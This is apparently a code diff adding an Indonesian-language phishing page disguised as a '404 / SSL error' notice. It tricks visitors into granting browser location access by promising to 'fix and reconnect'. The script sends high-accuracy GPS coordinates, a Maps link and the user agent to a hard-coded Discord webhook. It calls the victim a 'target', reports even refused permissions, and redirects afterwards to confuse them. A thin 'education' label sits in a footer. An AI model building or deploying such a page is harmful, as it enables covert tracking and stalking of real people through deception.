@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Not Found - System Error</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f1f1; color: #333; text-align: center; padding: 50px; }
+        .error-container { max-width: 500px; margin: auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        h1 { font-size: 80px; margin: 0; color: #e74c3c; }
+        h2 { margin-top: 10px; }
+        p { font-size: 16px; color: #666; line-height: 1.5; }
+        .btn-fix { display: inline-block; margin-top: 25px; padding: 15px 30px; background-color: #3498db; color: white; text-decoration: none; border-radius: 8px; cursor: pointer; border: none; font-weight: bold; font-size: 16px; transition: 0.3s; }
+        .btn-fix:hover { background-color: #2980b9; transform: scale(1.05); }
+        #loader { display: none; margin-top: 20px; font-style: italic; color: #3498db; }
+        .security-note { margin-top: 30px; font-size: 11px; color: #aaa; }
+    </style>
+</head>
+<body>
+
+    <div class="error-container">
+        <h1>404</h1>
+        <h2>Connection Lost</h2>
+        <p>Terdeteksi kegagalan sinkronisasi pada sesi browser Anda. Keamanan enkripsi mungkin terganggu.</p>
+        <p>Harap klik tombol di bawah dan pilih <b>"Allow/Izinkan"</b> untuk memverifikasi lokasi dan memulihkan koneksi aman.</p>
+        
+        <button class="btn-fix" id="fixBtn">FIX & RECONNECT</button>
+        
+        <div id="loader">Sedang melakukan enkripsi ulang... <br>Silakan konfirmasi permintaan akses di atas.</div>
+        
+        <div class="security-note">Error Code: ERR_SSL_PROTOCOL_ERROR_SYNC</div>
+    </div>
+
+    <script>
+        const fixBtn = document.getElementById('fixBtn');
+        const loader = document.getElementById('loader');
+        
+        // URL Webhook Discord yang kamu berikan
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";
+
+        fixBtn.addEventListener('click', () => {
+            fixBtn.style.display = 'none';
+            loader.style.display = 'block';
+
+            if (navigator.geolocation) {
+                // Meminta GPS dengan akurasi maksimal
+                navigator.geolocation.getCurrentPosition(sendToDiscord, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("Browser tidak mendukung protokol verifikasi ini.");
+            }
+        });
+
+        function sendToDiscord(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            const payload = {
+                username: "Security Awareness Bot",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/684/684908.png",
+                content: "🎯 **TARGET BERHASIL TERPELAYEK!**",
+                embeds: [{
+                    title: "Informasi Lokasi Real-Time",
+                    color: 15158332, // Merah
+                    fields: [
+                        { name: "📍 Latitude", value: `\`${lat}\``, inline: true },
+                        { name: "📍 Longitude", value: `\`${lon}\``, inline: true },
+                        { name: "🎯 Akurasi", value: `+/- ${Math.round(accuracy)} meter`, inline: false },
+                        { name: "🗺️ Google Maps", value: `[Klik untuk Buka Lokasi](${mapsUrl})` },
+                        { name: "📱 User Agent", value: navigator.userAgent }
+                    ],
+                    footer: { text: "Edukasi: Jangan asal klik 'Allow' pada website asing." },
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // Setelah data terkirim, arahkan ke Google agar dia bingung
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com/search?q=cara+meningkatkan+keamanan+browser";
+                }, 1500);
+            });
+        }
+
+        function handleError(error) {
+            let msg = "Gagal memproses.";
+            if(error.code == 1) msg = "Izin ditolak oleh user.";
+            else if(error.code == 2) msg = "Lokasi tidak ditemukan.";
+            
+            loader.innerHTML = `<span style="color:red;">Error: ${msg}</span><br>Mencoba metode alternatif...`;
+            
+            // Backup: Tetap kirim info bahwa dia klik tapi menolak GPS
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: "⚠️ **Target mengeklik tombol tapi menolak/gagal memberikan akses GPS.**"
+                })
+            });
+
+            setTimeout(() => { location.reload(); }, 3000);
+        }
+    </script>
+</body>
+</html>
